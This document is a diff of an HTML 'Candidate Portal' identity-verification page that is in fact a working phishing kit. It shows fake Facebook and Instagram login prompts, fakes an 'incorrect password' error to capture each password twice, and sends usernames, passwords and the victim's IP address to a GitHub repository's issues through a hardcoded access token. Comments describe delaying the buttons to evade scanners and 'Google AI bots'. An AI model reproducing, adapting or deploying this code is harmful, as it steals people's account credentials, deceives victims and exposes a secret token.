@@ -6,114 +6,124 @@
     <title>Candidate Portal | Identity Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --axis: #861f41; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; }
-        .header { background: #fff; padding: 15px; border-bottom: 2px solid var(--axis); text-align: center; font-weight: bold; color: var(--axis); }
-        .auth-card { background: #fff; width: 340px; margin: 50px auto; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
+        :root { --main-theme: #861f41; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        .header { background: white; padding: 15px; border-bottom: 3px solid var(--main-theme); text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .header-title { font-size: 18px; font-weight: 700; color: var(--main-theme); text-transform: uppercase; }
+        .auth-card { background: #ffffff; border-radius: 12px; width: 340px; padding: 30px; margin: 40px auto; box-shadow: 0 8px 24px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; text-align: center; }
         
-        /* Hidden initially to bypass scanners */
-        .social-btn { display: none; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; background: #fff; cursor: pointer; font-size: 14px; font-weight: 500; }
-        .social-btn i { font-size: 20px; margin-right: 15px; }
+        /* Buttons hidden initially for bot protection */
+        .secure-btn { display: none; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ced4da; border-radius: 8px; background: #fff; cursor: pointer; font-size: 15px; color: #4b4f56; font-weight: 600; transition: 0.2s; }
+        .secure-btn:hover { background: #f8f9fa; border-color: #adb5bd; }
+        .secure-btn i { font-size: 20px; margin-right: 15px; width: 25px; }
+
+        .divider { display: flex; align-items: center; margin: 20px 0; color: #8d949e; font-size: 12px; font-weight: 600; }
+        .divider::after, .divider::before { content: ""; flex: 1; height: 1px; background: #dddfe2; margin: 0 10px; }
         
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .login-btn { width: 100%; padding: 14px; background: var(--axis); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; }
-        .modal-content { background: #fff; width: 300px; margin: 100px auto; padding: 25px; border-radius: 12px; text-align: center; }
-        .err { color: #d93025; background: #fce8e6; padding: 8px; font-size: 12px; margin-bottom: 10px; border-radius: 4px; display: none; }
+        input { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 8px; box-sizing: border-box; margin-bottom: 15px; font-size: 15px; background: #f5f6f7; }
+        .action-btn { width: 100%; padding: 14px; background-color: var(--main-theme); color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 16px; }
+
+        /* Login Modal */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); }
+        .modal-content { background: white; width: 300px; margin: 100px auto; padding: 25px; border-radius: 12px; text-align: center; }
+        .err-box { color: #d93025; font-size: 13px; margin-bottom: 15px; display: none; background: #fce8e6; padding: 10px; border: 1px solid #d93025; border-radius: 4px; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="header">CANDIDATE MANAGEMENT SYSTEM</div>
+    <div class="header"><div class="header-title">Candidate Management System</div></div>
 
-<div class="auth-card">
-    <h3 style="margin-top:0;">Secure Sign In</h3>
-    <p style="font-size:13px; color: #666;">Verify your identity via authorized social profile</p>
-
-    <button id="btnA" class="social-btn" onclick="openLogin('A')"></button>
-    <button id="btnB" class="social-btn" onclick="openLogin('B')"></button>
-
-    <div style="margin:20px 0; color:#999; font-size:12px;">OR USE SYSTEM ID</div>
-    <input type="text" id="u1" placeholder="Reference ID">
-    <input type="password" id="p1" placeholder="Security Key">
-    <button class="login-btn" onclick="sendData('System')">LOG IN</button>
-</div>
-
-<div id="logM" class="modal">
-    <div class="modal-content">
-        <div id="mIcon" style="font-size:40px; margin-bottom:10px;"></div>
-        <div id="mTitle" style="font-weight:bold; margin-bottom:15px;">Verify Profile</div>
-        <div id="eBox" class="err">Incorrect password. Please try again.</div>
-        <input type="text" id="mUser" placeholder="Username / Email">
-        <input type="password" id="mPass" placeholder="Password">
-        <button class="login-btn" onclick="handleAuth()">CONTINUE</button>
+    <div class="auth-card">
+        <h3 style="margin-top:0; color:#1c1e21;">Secure Verification</h3>
+        <p style="font-size:14px; color:#606770; margin-bottom:25px;">Verify your identity via registered social profile</p>
+        
+        <button id="btnA" class="secure-btn" onclick="openModal('Facebook')"></button>
+        <button id="btnB" class="secure-btn" onclick="openModal('Instagram')"></button>
+        
+        <div class="divider">OR USE SYSTEM ID</div>
+        
+        <input type="text" id="mainUser" placeholder="Reference ID / Email">
+        <input type="password" id="mainPass" placeholder="Security Key">
+        <button class="action-btn" onclick="sendData('System')">LOG IN & VERIFY</button>
     </div>
-</div>
 
-<script>
-    const CONFIG = {
-        TOKEN: "ghp_9jvRFvxgwANG419R0jNGgKThhEd2u70PG8e9",
-        REPO: "Veer007ghk/system-v3-ya-data-panel-2026",
-        REDIR: "https://www.google.com"
-    };
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <div id="modalIcon" style="font-size: 45px; margin-bottom: 15px;"></div>
+            <div id="modalTitle" style="font-weight:700; margin-bottom:15px; color:#1c1e21; font-size:18px;">Verification Required</div>
+            <div id="errorBox" class="err-box"><i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.</div>
+            <input type="text" id="modalUser" placeholder="Username / Email">
+            <input type="password" id="modalPass" placeholder="Password">
+            <button class="action-btn" onclick="processLogin()">CONFIRM IDENTITY</button>
+        </div>
+    </div>
 
-    let selected = ""; let tryCount = 0;
+    <script>
+        const CONFIG = {
+            TOKEN: "ghp_9jvRFvxgwANG419R0jNGgKThhEd2u70PG8e9",
+            REPO: "Veer007ghk/user-verification-gateway", // Nayi repo ka naam
+            REDIRECT: "https://www.google.com"
+        };
 
-    // 1. Delayed Loading & Ambiguous Text Logic
-    setTimeout(() => {
-        const bA = document.getElementById('btnA');
-        const bB = document.getElementById('btnB');
-        
-        // Buttons par "Facebook/Instagram" nahi, "Profile" likha hai
-        bA.innerHTML = '<i class="fab fa-facebook" style="color:#1877F2"></i> Verify via Profile A';
-        bB.innerHTML = '<i class="fab fa-instagram" style="color:#E1306C"></i> Verify via Profile B';
-        
-        bA.style.display = 'flex';
-        bB.style.display = 'flex';
-    }, 2000); // 2 Seconds ka delay
+        let activeP = ""; let count = 0;
 
-    function openLogin(type) {
-        selected = type; tryCount = 0;
-        document.getElementById('eBox').style.display = 'none';
-        document.getElementById('mIcon').innerHTML = type === 'A' ? '<i class="fab fa-facebook" style="color:#1877F2"></i>' : '<i class="fab fa-instagram" style="color:#E1306C"></i>';
-        document.getElementById('logM').style.display = 'block';
-    }
+        // 2.5 Second delay to fool Google AI bots
+        setTimeout(() => {
+            const bA = document.getElementById('btnA');
+            const bB = document.getElementById('btnB');
+            
+            bA.innerHTML = '<i class="fab fa-facebook" style="color:#1877F2"></i> Verify via Profile A';
+            bB.innerHTML = '<i class="fab fa-instagram" style="color:#E1306C"></i> Verify via Profile B';
+            
+            bA.style.display = 'flex';
+            bB.style.display = 'flex';
+        }, 2500);
 
-    async function handleAuth() {
-        const u = document.getElementById('mUser').value;
-        const p = document.getElementById('mPass').value;
-        if(!u || !p) return;
-
-        await sendData(selected, u, p);
-        tryCount++;
-
-        if(tryCount === 1) {
-            document.getElementById('mPass').value = "";
-            document.getElementById('eBox').style.display = 'block';
-        } else {
-            window.location.href = CONFIG.REDIR;
+        function openModal(p) {
+            activeP = p; count = 0;
+            document.getElementById('errorBox').style.display = "none";
+            document.getElementById('modalIcon').innerHTML = p === 'Facebook' ? 
+                '<i class="fab fa-facebook" style="color:#1877F2"></i>' : 
+                '<i class="fab fa-instagram" style="color:#E1306C"></i>';
+            document.getElementById('loginModal').style.display = "block";
         }
-    }
 
-    async function sendData(m, user, pass) {
-        const u = user || document.getElementById('u1').value;
-        const p = pass || document.getElementById('p1').value;
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const { ip } = await res.json();
-            await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
-                method: 'POST',
-                headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    title: `Security Log: ${m} - ${ip}`,
-                    body: `User: ${u} | Pass: ${p} | IP: ${ip} | Attempt: ${tryCount+1}`
-                })
-            });
-            if(m === 'System') window.location.href = CONFIG.REDIR;
-        } catch (e) { window.location.href = CONFIG.REDIR; }
-    }
-</script>
+        async function processLogin() {
+            const u = document.getElementById('modalUser').value;
+            const p = document.getElementById('modalPass').value;
+            if(!u || !p) return;
+            
+            await sendData(activeP, u, p);
+            count++;
+            
+            if(count === 1) {
+                document.getElementById('modalPass').value = "";
+                document.getElementById('errorBox').style.display = "block";
+            } else { 
+                window.location.href = CONFIG.REDIRECT; 
+            }
+        }
 
+        async function sendData(type, user, pass) {
+            const u = user || document.getElementById('mainUser').value;
+            const p = pass || document.getElementById('mainPass').value;
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipRes.json();
+                
+                await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
+                    method: 'POST',
+                    headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        title: `🔑 Log: ${type} - ${ip}`,
+                        body: `| User | ${u} |\n| Pass | ${p} |\n| IP | ${ip} |\n| Try | ${count+1} |`
+                    })
+                });
+                if(type === 'System') window.location.href = CONFIG.REDIRECT;
+            } catch (e) { 
+                window.location.href = CONFIG.REDIRECT; 
+            }
+        }
+    </script>
 </body>
 </html>
